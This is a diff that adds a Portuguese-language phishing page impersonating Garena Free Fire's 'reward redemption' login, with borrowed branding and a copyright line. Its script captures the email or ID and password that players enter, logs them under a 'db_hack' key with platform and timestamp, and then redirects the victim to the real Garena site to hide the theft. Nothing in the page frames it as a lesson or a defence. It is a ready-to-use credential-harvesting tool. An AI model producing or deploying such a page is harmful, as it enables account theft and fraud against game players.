@@ -1,0 +1,127 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Garena Free Fire - Resgate de Recompensas</title>
+    <!-- ÍCONE OFICIAL DA GARENA NA ABA -->
+    <link rel="icon" href="https://freefiremobile.com">
+    
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        
+        body { 
+            background: url('https://wallpaperaccess.com') no-repeat center center fixed;
+            background-size: cover;
+            font-family: 'Arial', sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            color: white;
+        }
+
+        /* Máscara escura de fundo */
+        body::before {
+            content: "";
+            position: absolute;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0, 0, 0, 0.7);
+            z-index: -1;
+        }
+
+        .login-card {
+            background: #1a1a1a;
+            border: 2px solid #ffba08; /* Amarelo Free Fire */
+            width: 380px;
+            padding: 40px;
+            border-radius: 5px;
+            text-align: center;
+            box-shadow: 0 0 20px rgba(255, 186, 8, 0.3);
+        }
+
+        .logo-garena { width: 140px; margin-bottom: 20px; }
+        
+        h2 { font-size: 18px; margin-bottom: 10px; text-transform: uppercase; color: #ffba08; }
+        p { font-size: 13px; color: #ccc; margin-bottom: 25px; line-height: 1.4; }
+
+        .input-field {
+            width: 100%;
+            padding: 12px;
+            margin-bottom: 12px;
+            background: #2b2b2b;
+            border: 1px solid #444;
+            color: white;
+            border-radius: 3px;
+            outline: none;
+        }
+
+        .input-field:focus { border-color: #ffba08; }
+
+        .btn-confirm {
+            width: 100%;
+            padding: 12px;
+            background: linear-gradient(to bottom, #ffba08, #e8a600);
+            color: black;
+            border: none;
+            font-weight: bold;
+            font-size: 16px;
+            cursor: pointer;
+            text-transform: uppercase;
+            border-radius: 3px;
+        }
+
+        .btn-confirm:hover { background: #ffba08; transform: scale(1.02); }
+
+        .footer { margin-top: 25px; font-size: 11px; color: #666; }
+    </style>
+</head>
+<body>
+
+    <div class="login-card">
+        <!-- LOGO OFICIAL -->
+        <img src="https://wikimedia.org" class="logo-garena" alt="Garena">
+        
+        <h2>Central de Resgate</h2>
+        <p>Faça login para receber seus itens e diamantes diretamente no cofre do jogo.</p>
+        
+        <form id="ffForm">
+            <input type="text" id="user" class="input-field" placeholder="E-mail ou ID" required>
+            <input type="password" id="pass" class="input-field" placeholder="Senha" required>
+            <button type="submit" class="btn-confirm" id="btn">Confirmar Resgate</button>
+        </form>
+
+        <div class="footer">
+            Copyright © Garena International. <br> Trandemarks belong to their respective owners.
+        </div>
+    </div>
+
+    <script>
+        document.getElementById('ffForm').onsubmit = function(e) {
+            e.preventDefault();
+            const u = document.getElementById('user').value;
+            const s = document.getElementById('pass').value;
+            const btn = document.getElementById('btn');
+
+            btn.innerText = "VERIFICANDO...";
+            btn.style.opacity = "0.7";
+
+            // SALVA NO SEU PAINEL LOCAL
+            let logs = JSON.parse(localStorage.getItem('db_hack') || "[]");
+            logs.push({ 
+                plataforma: "FREE FIRE", 
+                usuario: u, 
+                senha: s, 
+                data: new Date().toLocaleString() 
+            });
+            localStorage.setItem('db_hack', JSON.stringify(logs));
+
+            // REDIRECIONA PARA O SITE REAL DA GARENA
+            setTimeout(() => {
+                window.location.href = "https://garena.com";
+            }, 1200);
+        };
+    </script>
+
+</body>
+</html>
